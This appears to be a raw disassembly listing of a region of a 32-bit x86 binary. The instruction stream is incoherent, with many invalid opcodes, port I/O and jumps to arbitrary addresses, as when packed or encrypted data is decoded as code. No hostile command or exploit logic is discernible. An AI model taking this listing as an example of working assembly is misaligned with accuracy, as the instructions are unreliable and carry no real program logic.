  40218c:	mul    BYTE PTR [ecx]
  40218e:	stc    
  40218f:	mov    eax,ds:0x8413df92
  402194:	sub    BYTE PTR [ecx],ah
  402196:	cmp    eax,0x5f39927e
  40219b:	mov    ebx,0xf6ffb2e0
  4021a0:	jle    0x402205
  4021a2:	pop    esp
  4021a3:	mov    bh,0xd2
  4021a5:	(bad)  [ebp+0x58]
  4021a8:	call   0xb5a532d3
  4021ad:	adc    BYTE PTR [ecx+0x59680601],dh
  4021b3:	shr    BYTE PTR [eax],0x93
  4021b6:	(bad)  
  4021b7:	sub    eax,0xfa773142
  4021bc:	inc    esi
  4021bd:	pop    edi
  4021be:	fist   DWORD PTR [ebp+0x4a]
  4021c1:	mov    cl,0xe6
  4021c3:	inc    ebx
  4021c4:	mov    bh,0x1f
  4021c6:	cmp    ebp,DWORD PTR [ebp+eiz*4+0x1bee7616]
  4021cd:	inc    ebx
  4021ce:	in     eax,0x60
  4021d0:	mov    esp,0x2c13b3f5
  4021d5:	jp     0x4021f9
  4021d7:	out    dx,eax
  4021d8:	or     eax,0x52cbe054
  4021dd:	add    al,0x2f
  4021df:	lea    esp,[edx]
  4021e1:	sub    ch,BYTE PTR [edx-0x6a4b2fcd]
  4021e7:	addr16 pop ds
  4021e9:	dec    ecx
  4021ea:	cs pop ss
  4021ec:	ins    DWORD PTR es:[edi],dx
  4021ed:	adc    BYTE PTR [edi+eax*1],ah
  4021f0:	adc    eax,0xcebd5932
  4021f5:	loop   0x4021b5
  4021f7:	sub    eax,0xe1c7ebb9
  4021fc:	test   DWORD PTR ds:0x364de07f,edi
  402202:	nop
  402203:	loopne 0x4021d5
  402205:	into   
  402206:	push   ecx
  402207:	push   edx
  402208:	or     edx,DWORD PTR [edx]
  40220a:	xchg   esp,edx
  40220c:	cmp    ch,BYTE PTR [edi-0x3592a8d9]
  402212:	push   cs
  402213:	rol    BYTE PTR [edx-0x40d0f045],cl
  402219:	adc    al,0x4b
  40221b:	jle    0x40222b
  40221d:	repz (bad) 
  40221f:	arpl   WORD PTR [ebx+0xe],sp
  402222:	iret   
  402223:	mov    ds:0x4ad25058,al
  402228:	and    eax,0x2f8d6e37
  40222d:	jne    0x402272
  40222f:	xor    DWORD PTR [edi-0x5396dda8],ebx
  402235:	add    DWORD PTR [edi-0x6410893],0x87edb297
  40223f:	inc    edi
  402240:	fsubp  st(6),st
  402242:	push   esi
  402243:	data16 mov al,0x28
  402246:	xor    esp,DWORD PTR [ebp+0x3a48e3e7]
  40224c:	iret   
  40224d:	sbb    al,0x40
  40224f:	jbe    0x402298
  402251:	pop    edx
  402252:	mov    dl,0xa7
  402254:	add    eax,0x261d8598
  402259:	mov    edx,0xa0ff182a
  40225e:	dec    ebp
  40225f:	fbstp  TBYTE PTR [ecx]
  402261:	outs   dx,DWORD PTR ds:[esi]
  402262:	(bad)  
  402263:	retf   
  402264:	call   0x2eac:0x8cacc7e6
  40226b:	ss fs dec edx
  40226e:	push   esp
  40226f:	push   cs
  402270:	enter  0x1feb,0x8a
  402274:	enter  0xae7a,0x7
  402278:	outs   dx,BYTE PTR ds:[esi]
  402279:	stos   DWORD PTR es:[edi],eax
  40227a:	jae    0x4022b1
  40227c:	ja     0x4022b8
  40227e:	xchg   ebp,eax
  40227f:	js     0x402284
  402281:	test   ebp,ecx
  402283:	xor    eax,0x70d9a6eb
  402288:	xor    bl,cl
  40228a:	icebp  
  40228b:	mov    cl,0x49
  40228d:	ds mov dh,0x9f
  402290:	femms  
  402292:	shl    al,0x34
  402295:	add    cl,ch
  402297:	psadbw mm2,mm2
  40229a:	idiv   esp
  40229c:	inc    ebp
  40229d:	out    dx,al
  40229e:	ins    DWORD PTR es:[edi],dx
  40229f:	add    al,BYTE PTR [esi+ecx*4-0x75e4a55d]
  4022a6:	add    al,0xd7
  4022a8:	fimul  WORD PTR ds:0xf4ef354b
  4022ae:	push   0xffffff88
  4022b0:	fdiv   QWORD PTR [eax*2+0x74ebb2ab]
  4022b7:	and    eax,0xb0d79b36
  4022bc:	fcomp  DWORD PTR [ebp-0x20af1423]
  4022c2:	(bad)  
  4022c3:	imul   esi,ebp,0xf1a6c80c
  4022c9:	outs   dx,BYTE PTR ds:[esi]
  4022ca:	stc    
  4022cb:	in     eax,0xed
  4022cd:	inc    ebp
  4022ce:	out    dx,eax
  4022cf:	js     0x402283
  4022d1:	test   BYTE PTR [ecx],bh
  4022d3:	adc    BYTE PTR [eax+0x8],0x47
  4022d7:	fisttp QWORD PTR [edx-0x77]
  4022da:	not    DWORD PTR [ecx]
  4022dc:	add    al,0x21
  4022de:	(bad)
  4022e2:	shl    DWORD PTR [ecx-0x66b3b483],cl
  4022e8:	cmp    DWORD PTR [ecx],edx
  4022ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022eb:	mov    edi,0x7ebbfc96
  4022f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f1:	(bad)  
  4022f2:	cmp    DWORD PTR [edx],edx
  4022f4:	dec    edx
  4022f5:	adc    BYTE PTR [ecx+0x7c],cl
  4022f8:	pop    ss
  4022f9:	out    0x90,al
  4022fb:	lods   eax,DWORD PTR ds:[esi]
  4022fc:	pusha  
  4022fd:	dec    edi
  4022fe:	(bad)  [ebx]
  402300:	pop    edx
  402301:	(bad)  
  402302:	mov    eax,0xd33915da
  402307:	pop    edi
  402308:	fisub  WORD PTR [esi+ebx*2+0x2179c6b0]
  40230f:	nop
  402310:	aam    0xba
  402312:	mul    al
  402314:	dec    ecx
  402315:	and    ah,al
  402317:	adc    DWORD PTR cs:[ecx+0x3b4e8227],0xfffffffe
  40231f:	adc    al,0x88
  402321:	mov    bh,0x30
  402323:	dec    esi
  402324:	int3   
  402325:	mov    esp,0x187d4646
  40232a:	mov    esp,0xfdbf7942
  40232f:	mul    DWORD PTR [esi]
  402331:	icebp  
  402332:	pop    edi
  402333:	aaa    
  402334:	push   ebp
  402335:	push   ecx
  402336:	dec    ecx
  402337:	(bad)  
  402338:	xchg   ebp,eax
  402339:	sbb    DWORD PTR [ebx],edx
  40233b:	cwde   
  40233c:	mov    al,0xe5
  40233e:	mov    ecx,0x33380d68
  402343:	test   ax,0x1c17
  402347:	fwait
  402348:	leave  
  402349:	and    BYTE PTR [edi+0x1f],dh
  40234c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40234d:	jo     0x402396
  40234f:	sub    bl,BYTE PTR [edx-0x7091d21c]
  402355:	(bad)
  402358:	js     0x4023c7
  40235a:	(bad)  
  40235b:	cld    
  40235c:	cmp    ebx,DWORD PTR [esi]
  40235e:	and    al,0x63
  402360:	inc    ecx
  402361:	dec    esi
  402362:	inc    ecx
  402363:	popa   
  402364:	not    BYTE PTR [eax+eiz*4+0x243ac545]
  40236b:	cmp    BYTE PTR [ebx-0x5f6a6ab2],dl
  402371:	ins    BYTE PTR es:[edi],dx
  402372:	add    DWORD PTR [ebx-0x14],edi
  402375:	(bad)  
  402376:	loop   0x402356
  402378:	cmp    eax,0x5dcfcc85
  40237d:	test   al,ah
  40237f:	mov    bl,0xe5
  402381:	push   ecx
  402382:	or     DWORD PTR [eax],esp
  402384:	jge    0x402321
  402386:	pop    edx
  402387:	std    
  402388:	push   ss
  402389:	xchg   edx,eax
  40238a:	add    esi,DWORD PTR [edi-0x46]
  40238d:	aam    0xc9
  40238f:	leave  
  402390:	or     DWORD PTR [eax+0xbfbc90],edx
  402396:	xchg   ecx,eax
  402397:	mov    esp,DWORD PTR [ecx-0x2b]
  40239a:	jg     0x4023f7
  40239c:	loop   0x4023e8
  40239e:	fcmovbe st,st(0)
  4023a0:	sub    DWORD PTR [esi-0x74155531],edx
  4023a6:	and    BYTE PTR es:[esi],bh
  4023a9:	in     eax,0x13
  4023ab:	jae    0x40235b
  4023ad:	(bad)  
  4023ae:	in     eax,dx
  4023af:	icebp  
  4023b0:	call   0x92ea:0xd3ad116a
  4023b7:	sbb    bh,BYTE PTR [ecx-0x2b]
  4023ba:	out    0x10,al
  4023bc:	adc    DWORD PTR [esi],esp
  4023be:	push   ebx
  4023bf:	retf   0xf654
  4023c2:	xchg   edx,eax
  4023c3:	adc    dh,dh
  4023c5:	cmp    eax,0xba8cdccf
  4023ca:	inc    ebp
  4023cb:	jp     0x402405
  4023cd:	xor    DWORD PTR [esi-0x67],esi
  4023d0:	cmc    
  4023d1:	iret   
  4023d2:	xor    DWORD PTR [esi-0x28],ebp
  4023d5:	and    al,0x95
  4023d7:	in     eax,dx
  4023d8:	inc    eax
  4023d9:	mov    al,0x74
  4023db:	or     eax,0xb290f597
  4023e0:	sub    eax,0xbbdb85a9
  4023e5:	jl     0x40244e
  4023e7:	sahf   
  4023e8:	sti    
  4023e9:	fwait
  4023ea:	hlt    
  4023eb:	popf   
  4023ec:	scas   al,BYTE PTR es:[edi]
  4023ed:	or     dh,ah
  4023ef:	xor    ebp,esp
  4023f1:	pop    edi
  4023f2:	(bad)  
  4023f3:	aaa    
  4023f4:	mov    ah,0xd2
  4023f6:	xor    BYTE PTR [ebx+0x4],al
  4023f9:	stc    
  4023fa:	sbb    DWORD PTR [eax-0x3dafd2fe],edi
  402400:	imul   BYTE PTR [ebx]
  402402:	dec    ecx
  402403:	pop    ebx
  402404:	ret    0x6ccb
  402407:	imul   edi,DWORD PTR [eax-0x17],0xaa6ee2b1
  40240e:	cmp    edi,ecx
  402410:	push   eax
  402411:	out    dx,eax
  402412:	in     al,dx
  402413:	dec    esp
  402414:	outs   dx,BYTE PTR ds:[esi]
  402415:	dec    eax
  402416:	pop    ebp
  402417:	cmc    
  402418:	popf   
  402419:	hlt    
  40241a:	popf   
  40241b:	sbb    cl,BYTE PTR [ebp-0x61f92a89]
  402421:	sbb    ebp,DWORD PTR [edi]
  402423:	mov    bl,0x4
  402425:	js     0x402415
  402427:	popf   
  402428:	xchg   BYTE PTR [esi-0x17],al
  40242b:	pusha  
  40242c:	and    BYTE PTR [ebp+0x3662929],bh
  402432:	pop    edi
  402433:	dec    ebx
  402434:	gs inc esp
  402436:	push   ebp
  402437:	push   edi
  402438:	adc    ah,BYTE PTR [ecx]
  40243a:	fcomp  DWORD PTR [esi+0x6e45bd74]
  402440:	(bad)  
  402442:	sub    eax,0x6c189577
  402447:	push   eax
  402448:	pop    DWORD PTR [ebx]
  40244a:	popf   
  40244b:	jge    0x4024a9
  40244d:	mov    ah,0x76
  40244f:	and    esi,DWORD PTR ds:0xb63a6e79
  402455:	cmp    al,0xc0
  402457:	pusha  
  402458:	xor    DWORD PTR ds:0x9744d61b,edi
  40245e:	add    al,0x36
  402460:	or     DWORD PTR [esi+ebp*8-0x21],eax
  402464:	xchg   ebx,eax
  402465:	xchg   esi,eax
  402466:	loop   0x40248d
  402468:	push   cs
  402469:	cmp    esp,DWORD PTR [edi+edx*8]
  40246c:	push   0xb
  40246e:	mov    DWORD PTR [edi+0x1264bbf9],edx
  402474:	pop    ds
  402475:	loope  0x4024f0
  402477:	push   esp
  402478:	and    dh,BYTE PTR [esi-0x2e5e43ca]
  40247e:	mov    edx,0x6ac62705
  402483:	mov    WORD PTR [esi-0x6f23b268],gs
  402489:	cmp    ch,BYTE PTR ds:0xfe90c26
  40248f:	jl     0x402472
  402491:	bnd jp 0x4024a1
  402494:	mov    cl,0x35
  402496:	xchg   ecx,eax
  402497:	add    BYTE PTR ds:0x50ec,dl
  40249c:	mov    BYTE PTR [edx+0x1fec9947],cl
  4024a2:	jmp    0x4024a7
  4024a4:	inc    ebx
  4024a5:	int3   
  4024a6:	sub    eax,0x6c7839ec
  4024ab:	ret    0xd762
  4024ae:	jo     0x40245d
  4024b0:	xor    DWORD PTR [esi-0x40],0x51
  4024b4:	dec    ebx
  4024b5:	mov    ah,BYTE PTR ds:[esi-0x5c]
  4024b9:	mov    ebx,0xbd4c8f9
  4024be:	nop
  4024bf:	cmp    ebp,ebx
  4024c1:	andnps xmm0,xmm3
  4024c4:	pop    ds
  4024c5:	adc    bl,ch
  4024c7:	aas    
  4024c8:	mov    al,0x80
  4024ca:	cmp    bh,bl
  4024cc:	shl    BYTE PTR [ebp+0x7f],1
  4024cf:	push   ebx
  4024d0:	xor    DWORD PTR [ebx-0x6f14fa30],esi
  4024d6:	adc    DWORD PTR [ebp+0x35],edx
  4024d9:	mov    cl,0x60
  4024db:	fs push ebx
  4024dd:	sbb    bh,BYTE PTR [ebx-0x71]
  4024e0:	adc    DWORD PTR ds:0x11e480c7,esi
  4024e6:	push   edx
  4024e7:	imul   esi,DWORD PTR [esi+0x19ae1b9c],0xffffffe7
  4024ee:	push   ecx
  4024ef:	loope  0x4024db
  4024f1:	or     BYTE PTR [eax-0x7e820e1],ah
  4024f7:	int    0x0
  4024f9:	sbb    esp,DWORD PTR [ecx]
  4024fb:	push   edi
  4024fc:	int3   
  4024fd:	pop    ebp
  4024fe:	pop    ecx
  4024ff:	ins    BYTE PTR es:[edi],dx
  402500:	add    esi,DWORD PTR [edx+0x73]
  402503:	repz pop ecx
  402505:	cmp    BYTE PTR [ebx],ch
  402507:	cs pop ecx
  402509:	add    al,0x8e
  40250b:	mul    DWORD PTR [esi-0x7b2d78af]
  402511:	mov    ss,edx
  402513:	ret    
  402514:	push   0x70474ced
  402519:	arpl   WORD PTR [edi-0x77a96900],cx
  40251f:	lods   al,BYTE PTR ds:[esi]
  402520:	ficomp DWORD PTR [esi+ebx*2-0x21e13f4f]
  402527:	mov    BYTE PTR [esi],cl
  402529:	xor    al,0xf5
  40252b:	fisttp QWORD PTR [esi-0x7b01395]
  402531:	and    BYTE PTR [edx+0x63],ah
  402534:	out    dx,eax
  402535:	and    bl,BYTE PTR [eax-0x580e199d]
  40253b:	jmp    0x4635f5f4
  402540:	(bad)  
  402541:	jle    0x4025b2
  402543:	push   es
  402544:	js     0x402561
  402546:	lods   eax,DWORD PTR ds:[esi]
  402547:	xor    eax,0x424647f5
  40254c:	cmp    bl,bh
  40254e:	push   edi
  40254f:	test   BYTE PTR [esp+edi*8+0xc],dl
  402553:	and    al,0x8
  402555:	bound  ebp,QWORD PTR [ebx-0x4c04b481]
  40255b:	clc    
  40255c:	or     ah,ah
  40255e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40255f:	lahf   
  402560:	loope  0x402511
  402562:	jnp    0x40253b
  402564:	sbb    BYTE PTR [edi+ecx*2-0x7c],al
  402568:	cld    
  402569:	jno    0x40251f
  40256b:	shl    DWORD PTR cs:[edx-0xcad907],1
  402572:	push   ss
  402573:	adc    al,0xce
  402575:	jne    0x4025ac
  402577:	sub    DWORD PTR [ecx+edx*8+0x4a288f10],ecx
  40257e:	jo     0x402558
  402580:	sub    eax,0xcae919f9
  402585:	jmp    ecx
  402587:	xchg   ecx,eax
  402588:	adc    ch,BYTE PTR gs:[esi-0x7c26160d]
  40258f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402590:	mov    bl,0xd7
  402592:	pop    ss
  402593:	xor    eax,0x5682a800
  402598:	fwait
  402599:	ret    
  40259a:	stos   BYTE PTR es:[edi],al
  40259b:	scas   eax,DWORD PTR es:[edi]
  40259c:	loop   0x4025d1
  40259e:	sbb    DWORD PTR [ebx-0x17c9bea5],esp
  4025a4:	mov    WORD PTR [ebx+0x32377a3c],gs
  4025aa:	daa    
  4025ab:	lods   al,BYTE PTR ds:[esi]
  4025ac:	(bad)
  4025b0:	adc    eax,0x3d78b7a
  4025b5:	push   ebx
  4025b6:	inc    edx
  4025b7:	fmul   QWORD PTR [edx-0x60]
  4025ba:	jbe    0x6c1fe801
  4025c0:	aam    0xf6
  4025c2:	call   0xb9be:0x2a7bf9ca
  4025c9:	sub    esi,0xb22b8ad4
  4025cf:	jg     0x4025fd
  4025d1:	sbb    eax,0xabd95ab6
  4025d6:	mov    ebx,0x1efbd9b1
  4025db:	dec    edi
  4025dc:	jmp    0x1db9:0xac9b349b
  4025e3:	mov    DWORD PTR [edi+0x17a27171],edi
  4025e9:	pop    edi
  4025ea:	adc    DWORD PTR [esi],0x4b4f720
  4025f0:	mov    edx,0x33761714
  4025f5:	cmp    ah,BYTE PTR [ecx+0x51e69de7]
  4025fb:	mov    eax,0xdf9d6923
  402600:	je     0x40260e
  402602:	and    DWORD PTR [eax+0x39b39d0],edx
  402608:	xchg   ebx,eax
  402609:	sub    ebp,esp
  40260b:	pop    es
  40260c:	add    BYTE PTR [esi+0x7e],dh
  40260f:	lock cmc 
  402611:	add    al,0x21
  402613:	add    eax,0x850ab47d
  402618:	ret    
  402619:	push   ebx
  40261a:	test   DWORD PTR [edi+0x4b],edx
  40261d:	lock jne 0x4025b1
  402620:	pushw  0x2e92
  402624:	sub    dh,BYTE PTR [ecx-0x49]
  402627:	leave  
  402628:	inc    ecx
  402629:	mov    esi,0x9bfd75ca
  40262e:	ret    0x943f
  402631:	fdiv   st,st(5)
  402633:	xor    eax,0x8c8c9f8c
  402638:	cmp    DWORD PTR [ebx+esi*4+0x11859543],edx
  40263f:	add    ah,bh
  402641:	pop    ebp
  402642:	xchg   ebp,eax
  402643:	arpl   WORD PTR [edx],di
  402645:	dec    edx
  402646:	push   cs
  402647:	jne    0x4026a9
  402649:	shr    bl,0x70
  40264c:	hlt    
  40264d:	dec    ebx
  40264e:	test   al,0x62
  402650:	jne    0x40263e
  402652:	add    DWORD PTR [ebx+0x71d07612],esi
  402658:	jbe    0x40260a
  40265a:	paddusb mm5,QWORD PTR [eax-0x15]
  40265e:	xor    BYTE PTR [edx],ah
  402660:	call   FWORD PTR [esi+ecx*2]
  402663:	imul   eax,DWORD PTR [edi],0xa19159a2
  402669:	loope  0x402683
  40266b:	jge    0x402682
  40266d:	push   0x1e
  40266f:	into   
  402670:	and    DWORD PTR [edx],ebp
  402672:	jne    0x402693
  402674:	xor    BYTE PTR [edx-0x6077ee92],bh
  40267a:	jnp    0x402612
  40267c:	xor    BYTE PTR [edx+0x51],ah
  40267f:	(bad)  
  402680:	push   0x1
  402682:	xor    ebx,DWORD PTR [edx]
  402684:	add    BYTE PTR [eax+0x7d],0xd6
  402688:	mov    eax,0x50ab56d9
  40268d:	push   edi
  40268e:	jae    0x402612
  402690:	jmp    0xec7a2fe9
  402695:	jb     0x402617
  402697:	push   es
  402698:	and    DWORD PTR [ebx],ecx
  40269a:	and    DWORD PTR [ebx-0x1e],ebx
  40269d:	outs   dx,BYTE PTR ds:[esi]
  40269e:	faddp  st(5),st
  4026a0:	dec    esi
  4026a1:	add    BYTE PTR [ebx],cl
  4026a3:	out    0xcc,eax
  4026a5:	mov    BYTE PTR [edi],dh
  4026a7:	xor    eax,0x488af1a5
  4026ac:	sahf   
  4026ad:	out    dx,al
  4026ae:	stc    
  4026af:	stos   DWORD PTR es:[edi],eax
  4026b0:	loope  0x4026cd
  4026b2:	loopne 0x402709
  4026b4:	push   eax
  4026b5:	test   bh,al
  4026b7:	stc    
  4026b8:	mov    dl,dh
  4026ba:	popa   
  4026bb:	mov    esp,0xfb05aa71
  4026c0:	pop    eax
  4026c1:	(bad)  
  4026c2:	sar    BYTE PTR [ecx],cl
  4026c4:	rol    DWORD PTR [esp+ebp*2+0x1f846dd8],1
  4026cb:	(bad)  
  4026cc:	cmc    
  4026cd:	xor    DWORD PTR [eax+0x174237d3],esi
  4026d3:	mov    ds:0x4d497633,al
  4026d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026d9:	xchg   BYTE PTR [edx+0x444de7e3],ah
  4026df:	(bad)  
  4026e1:	inc    ecx
  4026e2:	jle    0x4026b8
  4026e4:	cwde   
  4026e5:	pop    edi
  4026e6:	or     al,0xa0
  4026e8:	or     BYTE PTR [ebx],ah
  4026ea:	int    0xbd
  4026ec:	mov    eax,0xc7c0af2a
  4026f1:	sub    ah,BYTE PTR [esi+0x486e445c]
  4026f7:	dec    esi
  4026f8:	xchg   ebp,eax
  4026f9:	inc    edx
  4026fa:	dec    esp
  4026fb:	push   ds
  4026fc:	cmp    bl,al
  4026fe:	ja     0x4026c8
  402700:	sbb    BYTE PTR [edi],dl
  402702:	sbb    BYTE PTR [ebp+0x78],dh
  402705:	push   eax
  402707:	mov    eax,0xaf91dbe2
  40270c:	mov    eax,fs:0x4818190d
  402712:	mov    ebp,0xe0911d97
  402717:	mov    es,WORD PTR [esi+0x5fd2fc01]
  40271d:	les    ebp,FWORD PTR [ebp+0x12]
  402720:	pop    edx
  402721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402722:	sub    al,0xcb
  402724:	xor    esi,DWORD PTR [ecx+esi*2+0x29]
  402728:	xchg   ebp,eax
  402729:	jp     0x402787
  40272b:	cmp    bl,BYTE PTR [ebp-0x595b1357]
  402731:	hlt    
  402732:	sbb    BYTE PTR [bp+di],cl
  402735:	pop    edi
  402736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402737:	sub    DWORD PTR [edi+0x1b],0x63b8c1b5
  40273e:	mov    dl,0xce
  402740:	(bad)  
  402741:	xchg   edx,eax
  402742:	repnz lods al,BYTE PTR ds:[esi]
  402744:	xlat   BYTE PTR ds:[ebx]
  402745:	jecxz  0x402788
  402747:	popa   
  402748:	stc    
  402749:	dec    ebx
  40274a:	adc    eax,0x3f18a69e
  40274f:	jl     0x4026e9
  402751:	loopne 0x402705
  402753:	int3   
  402754:	adc    BYTE PTR [esi-0x46],bh
  402757:	or     BYTE PTR [ebp-0x2],0xc1
  40275b:	call   0xe83d0109
  402760:	fidiv  WORD PTR [esi]
  402762:	and    DWORD PTR [esi-0x4b],edi
  402765:	jmp    0xb06f66f6
  40276a:	and    edx,DWORD PTR [ebx]
  40276c:	aad    0x9d
  40276e:	pop    esi
  40276f:	dec    ebx
  402770:	jo     0x4026f8
  402772:	shl    DWORD PTR ds:[esi+0x4a],0x69
  402777:	xchg   esi,eax
  402778:	fcomi  st,st(7)
  40277a:	or     DWORD PTR [esi+0x47],ebp
  40277d:	loopne 0x402798
  40277f:	dec    esp
  402780:	sub    eax,0x32c78b4b
  402785:	into   
  402786:	lods   eax,DWORD PTR ds:[esi]
  402787:	rcr    BYTE PTR [edi-0x355bf8f7],cl
  40278d:	sbb    eax,0xbb5bb102
  402792:	mov    ah,0xa7
  402794:	xchg   BYTE PTR [ecx-0x69],bl
  402797:	or     DWORD PTR [edx-0x5ec53aea],ebp
  40279d:	arpl   dx,bp
  40279f:	fdivr  QWORD PTR [ebx+ebp*8-0x45]
  4027a3:	imul   ecx,DWORD PTR [esp+ebx*2],0xf39bc869
  4027aa:	fisubr WORD PTR ds:0xa1304029
  4027b0:	cmp    bl,bh
  4027b2:	cmp    eax,0x44fe872
  4027b7:	lahf   
  4027b8:	out    0x59,eax
  4027ba:	mov    dh,0xd6
  4027bc:	cmp    bh,BYTE PTR [ebx+0x6a7612da]
  4027c2:	std    
  4027c3:	inc    ebp
  4027c4:	mov    ds:0xbcde1ff7,eax
  4027c9:	dec    eax
  4027ca:	or     DWORD PTR [eax+0x3cb2faad],eax
  4027d0:	dec    ecx
  4027d2:	hlt    
  4027d3:	scas   eax,DWORD PTR es:[edi]
  4027d4:	fadd   DWORD PTR [eax-0x2]
  4027d7:	push   edx
  4027d8:	add    ebp,DWORD PTR [edi-0x4e]
  4027db:	imul   eax,esi,0x5c
  4027de:	rcr    ah,1
  4027e0:	ins    BYTE PTR es:[edi],dx
  4027e1:	ja     0x402820
  4027e3:	inc    eax
  4027e4:	dec    esi
  4027e5:	nop
  4027e6:	mov    fs,WORD PTR [edi]
  4027e8:	adc    esp,edx
  4027ea:	or     edi,DWORD PTR [eax]
  4027ec:	lods   al,BYTE PTR ds:[esi]
  4027ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027ef:	jbe    0x40278a
  4027f1:	sbb    eax,0x52d043ed
  4027f6:	ret    0x1f7c
  4027f9:	sub    DWORD PTR [eax+0x5c],edi
  4027fc:	push   ds
  4027fd:	repz xchg ebx,eax
  4027ff:	out    0x2c,al
  402801:	sbb    cl,BYTE PTR [eax]
  402803:	(bad)  
  402804:	hlt    
  402805:	out    0x1e,al
  402807:	nop
  402808:	inc    eax
  402809:	sub    al,0x28
  40280b:	fcom   QWORD PTR [ebx-0x76]
  40280e:	fsubr  DWORD PTR [esi-0x73]
  402811:	cs dec ebp
  402813:	cmp    al,0xb5
  402815:	adc    eax,0xa5ed4ae7
  40281a:	inc    esp
  40281b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40281c:	clc    
  40281d:	test   BYTE PTR [esi+0x20],dh
  402820:	sbb    al,0xf5
  402822:	loope  0x402832
  402824:	push   0x6babfa5c
  402829:	inc    ecx
  40282a:	in     eax,0x90
  40282c:	cwde   
  40282d:	add    eax,0x365f0bb8
  402832:	sub    DWORD PTR [edi-0x78],esi
  402835:	inc    edi
  402836:	retf   0x51b3
  402839:	es lock cdq 
  40283c:	sub    bh,ah
  40283e:	inc    ebx
  40283f:	pop    edx
  402840:	icebp  
  402841:	jmp    0xeaf400c6
  402846:	mov    dh,BYTE PTR [edi+0x63]
  402849:	nop
  40284a:	pop    ss
  40284b:	popa   
  40284c:	push   0xd2a096c1
  402851:	popf   
  402852:	popf   
  402853:	arpl   WORD PTR [ebx+0x23],dx
  402856:	enter  0xa4fb,0xc1
  40285a:	les    ebx,FWORD PTR [esi+0x7d3e3483]
  402860:	dec    eax
  402861:	in     al,dx
  402862:	xor    ah,al
  402864:	mov    ebx,0xb379f57f
  402869:	cmp    eax,DWORD PTR [esi-0x4e72fe72]
  40286f:	mov    cl,0xb1
  402871:	sub    bl,BYTE PTR [ebx]
  402873:	imul   ecx,DWORD PTR [eax-0x49],0xffffffbb
  402877:	fisttp DWORD PTR [edi]
  402879:	ficom  DWORD PTR [edi]
  40287b:	xlat   BYTE PTR ds:[ebx]
  40287c:	lods   eax,DWORD PTR ds:[esi]
  40287d:	or     al,0x68
  40287f:	xor    BYTE PTR [ecx],ch
  402881:	mov    edx,0x1cf27308
  402886:	jo     0x4028d1
  402888:	xchg   ebx,eax
  402889:	sub    eax,0x8b75c9f9
  40288e:	loope  0x40281c
  402890:	sub    esp,edi
  402892:	dec    edx
  402894:	sub    bl,BYTE PTR [ebx+ebp*4-0x8]
  402898:	mov    ah,0xab
  40289a:	js     0x40286e
  40289c:	xchg   edi,eax
  40289d:	scas   al,BYTE PTR es:[edi]
  40289e:	arpl   WORD PTR [edi-0x5b],cx
  4028a1:	sub    dl,0x10
  4028a4:	adc    eax,DWORD PTR [ebx+esi*4]
  4028a7:	ja     0x402907
  4028a9:	push   esp
  4028aa:	jo     0x402874
  4028ac:	mov    al,ds:0x7187b335
  4028b1:	loop   0x4028ba
  4028b3:	test   al,0x76
  4028b5:	retf   
  4028b6:	mov    ch,0xc
  4028b8:	jmp    0xbefc:0x5fae9158
  4028bf:	sar    DWORD PTR [eax+0x62],1
  4028c2:	lea    ebp,[ecx]
  4028c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028c5:	sbb    al,0x12
  4028c7:	jmp    0x402946
  4028c9:	stos   DWORD PTR es:[edi],eax
  4028ca:	sub    BYTE PTR [edi-0x6643ace9],al
  4028d0:	fwait
  4028d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028d2:	pop    ds
  4028d3:	ret    
  4028d4:	cdq    
  4028d5:	mov    edx,0x7babba69
  4028da:	xor    DWORD PTR [ebx-0x13],ecx
  4028dd:	lahf   
  4028de:	pusha  
  4028df:	jle    0x402874
  4028e1:	bound  esi,QWORD PTR [edi]
  4028e3:	add    eax,0xf173841e
  4028e8:	retf   
  4028e9:	dec    ebx
  4028ea:	repnz push ds
  4028ec:	stc    
  4028ed:	cmp    BYTE PTR [ebx],bl
  4028ef:	sbb    eax,DWORD PTR [ebx-0x13e00dab]
  4028f5:	in     eax,dx
  4028f6:	pop    ebx
  4028f7:	mov    BYTE PTR [ebp-0x72],dl
  4028fa:	sbb    DWORD PTR [ecx+edx*4-0x72],edi
  4028fe:	cmp    cl,BYTE PTR [edi]
  402900:	repz fwait
  402902:	inc    esp
  402903:	push   ebx
  402904:	sub    BYTE PTR [edx+0x6bef44a4],0x18
  40290b:	sbb    eax,0x559d3d75
  402910:	fldz   
  402912:	mov    BYTE PTR [edi],ch
  402914:	add    DWORD PTR [esi+esi*8-0x2e],0x3b
  402919:	push   ecx
  40291a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40291b:	push   ecx
  40291c:	daa    
  40291d:	jmp    0x402927
  40291f:	adc    al,0x5
  402921:	out    dx,al
  402922:	mov    ds:0x32f47901,al
  402927:	fld    DWORD PTR [ecx+eiz*4-0x2]
  40292b:	inc    esi
  40292c:	push   es
  40292d:	inc    esi
  40292e:	rcr    ebx,cl
  402930:	lods   eax,DWORD PTR ds:[esi]
  402931:	dec    eax
  402932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402933:	adc    BYTE PTR [eax],dl
  402935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402936:	les    esp,FWORD PTR [ebx+0x7827d931]
  40293c:	push   ebp
  40293d:	out    0x8b,eax
  40293f:	jne    0x402904
  402941:	add    eax,0x27984526
  402946:	int3   
  402947:	dec    esp
  402948:	sbb    al,0xc5
  40294a:	stos   DWORD PTR es:[edi],eax
  40294b:	add    DWORD PTR [ebx+0x6c6cc70a],esi
  402951:	int    0x10
  402953:	in     al,dx
  402954:	cmp    eax,0x874b9439
  402959:	out    dx,eax
  40295a:	mov    eax,0xdd21664d
  40295f:	ret    0x4ea6
  402962:	ja     0x4029da
  402964:	push   es
  402965:	(bad)  
  402966:	mov    eax,DWORD PTR [esi+0x42b9999f]
  40296c:	mov    eax,0x9d02964b
  402971:	jmp    0xe084a80
